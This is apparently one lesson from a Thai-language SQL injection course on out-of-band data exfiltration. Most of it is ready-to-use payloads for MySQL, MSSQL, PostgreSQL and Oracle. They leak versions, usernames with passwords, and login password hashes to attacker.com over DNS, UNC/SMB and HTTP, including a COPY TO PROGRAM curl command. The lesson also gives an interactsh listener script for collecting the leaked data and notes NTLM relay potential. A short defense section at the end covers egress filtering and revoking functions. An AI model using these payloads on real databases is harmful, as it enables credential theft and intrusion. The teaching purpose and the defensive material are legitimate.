# Part 092: Advanced Out-of-Band (OOB) Techniques

## ภาพรวม

OOB channels: DNS, HTTP, SMB, ICMP สำหรับข้อมูลในสภาพที่ blind

**ขั้นตอนที่ 1451-1465**

---

## 1451. DNS Exfiltration (MySQL)

```sql
-- MySQL LOAD_FILE UNC path (Windows only)
-- หลักการ: DB server ทำ DNS lookup คือนไปยัง attacker

-- Step 1: exfiltrate version()
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.attacker.burpcollaborator.net\\share'));
-- DNS query: 8.0.32-ubuntu.attacker.burpcollaborator.net

-- Step 2: exfiltrate database name
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.d1.attacker.com\\a'));

-- Step 3: exfiltrate table data (base64 encode to avoid DNS issues)
SELECT LOAD_FILE(CONCAT(
    '\\\\', 
    TO_BASE64((SELECT CONCAT(username,':',password) FROM users LIMIT 1)),
    '.d2.attacker.com\\a'
));

-- Receive with Burp Collaborator / interactsh:
# interactsh-client -v
# Listen for DNS queries at <random>.oast.pro
```

---

## 1452. DNS Exfiltration (MSSQL)

```sql
-- MSSQL: xp_dirtree สำหรับ OOB DNS (ไม่ต้องการ xp_cmdshell!)

-- Basic DNS lookup:
EXEC master..xp_dirtree '\\version.attacker.com\test';
-- Alternative:
EXEC master..xp_fileexist '\\version.attacker.com\test';

-- Exfiltrate data:
DECLARE @q NVARCHAR(1000);
SET @q = '\\' + (SELECT TOP 1 name FROM sys.databases) + '.attacker.com\test';
EXEC master..xp_dirtree @q;

-- Exfiltrate user hash:
DECLARE @h NVARCHAR(200);
SELECT @h = (SELECT TOP 1 CAST(password_hash AS VARCHAR(MAX)) FROM sys.sql_logins);
EXEC master..xp_dirtree ('\\' + @h + '.attacker.com\test');

-- SMB relay potential:
-- ถ้า DB server ส่ง NTLM auth ไปยัง attacker server
-- สามารถ relay เพื่อ authenticate ไปยัง target อื่น
```

---

## 1453. PostgreSQL OOB via COPY

```sql
-- PostgreSQL COPY TO + curl (ต้องมี COPY privilege)
COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?v=$(cat /dev/stdin)';

-- OOB ผ่าน dblink (extension ต้องถูก enable):
SELECT dblink_connect(
    'host=' || encode(version()::bytea, 'hex') || '.attacker.com user=x dbname=x'
);

-- Oracle UTL_HTTP OOB:
SELECT UTL_HTTP.REQUEST('http://attacker.com/?d=' || user) FROM dual;

-- Oracle DNS via UTL_FILE + UTL_INADDR:
SELECT UTL_INADDR.GET_HOST_ADDRESS(
    (SELECT user FROM dual) || '.attacker.com'
) FROM dual;
```

---

## 1454. OOB Detection Infrastructure

```python
# interactsh Python client สำหรับ receive OOB data
import asyncio
import httpx
import json

OAST_SERVER = 'https://oast.pro'  # public instance

async def setup_oob_listener():
    """ลงทะเบียน OOB listener กับ interactsh"""
    async with httpx.AsyncClient() as client:
        # Register
        r = await client.post(f'{OAST_SERVER}/register', json={})
        data = r.json()
        token = data.get('token')
        subdomain = data.get('correlation-id')
        
        print(f"OOB subdomain: {subdomain}.oast.pro")
        print(f"Token: {token}")
        
        # Poll for interactions
        while True:
            await asyncio.sleep(5)
            interactions = await client.get(
                f'{OAST_SERVER}/poll?id={subdomain}&secret={token}'
            )
            data = interactions.json()
            if data.get('data'):
                for interaction in data['data']:
                    print(f"[OOB] Type: {interaction.get('protocol')}")
                    print(f"[OOB] From: {interaction.get('remote-address')}")
                    print(f"[OOB] Data: {interaction.get('raw-request', '')[:200]}")

asyncio.run(setup_oob_listener())
```

---

## 1455. OOB Defense

```
ป้องกัน OOB Exfiltration:

1. Network Egress Filtering:
   - DB server ต้องไม่ส่ง traffic ออก internet
   - ใช้ firewall rules: DENY outbound จาก DB IP
   - DNS: ใช้ internal DNS server เท่านั้น
   
2. Disable Dangerous Functions:
   MySQL:
     SET GLOBAL secure_file_priv = '/dev/null';
     REVOKE FILE ON *.* FROM ALL USERS;
   
   MSSQL:
     EXEC sp_configure 'xp_cmdshell', 0;
     -- xp_dirtree ใช้ยากกว่า แต่ยังทำได้โดย public role
     -- ต้อง revoke EXECUTE ด้วย:
     REVOKE EXECUTE ON xp_dirtree FROM public;
     REVOKE EXECUTE ON xp_fileexist FROM public;
   
   PostgreSQL:
     DROP EXTENSION IF EXISTS dblink;
     REVOKE EXECUTE ON ALL FUNCTIONS IN SCHEMA public FROM PUBLIC;

3. Monitor:
   - Log DNS queries จาก DB server
   - Alert ถ้า DB server ทำ outbound connection
```

---

## สรุป

Advanced OOB:
- **MySQL** - LOAD_FILE UNC + DNS
- **MSSQL** - xp_dirtree ไม่ต้อง cmdshell
- **PostgreSQL** - COPY TO PROGRAM + dblink
- **interactsh** - receive OOB interactions
- **Defense** - egress filtering + disable functions

---

*Part 092 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
